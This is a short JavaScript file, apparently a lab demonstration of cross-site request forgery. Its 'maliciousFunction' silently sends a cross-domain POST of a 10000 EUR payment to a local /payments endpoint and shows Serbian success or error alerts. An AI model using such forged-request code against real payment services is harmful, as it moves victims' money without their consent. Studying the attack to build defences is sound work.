function JSONNewPayment(recipient, account, amount, currency, managerId) {
	return JSON.stringify({
		"recipient" : recipient,
		"account" : account,
		"amount" : amount,
		"currency" : currency,
		"managerId" : managerId
	});
}

function maliciousFunction() {
	recipient = "Mina Medić";
	account = 123;
	amount = 10000;
	currency = "EUR";
	managerId = 1;
	
	$.ajax({
		type : "POST",
		contentType : "application/json",
		crossDomain: true,
		url : "http://localhost:8080/payments",
		data : JSONNewPayment(recipient, account, amount, currency, managerId),
		success : function() {
			alert("Uplata je uspešno izvršena.");
		},
		error : function(e) {
			alert("Dogodila se greška!");
		}
	});
}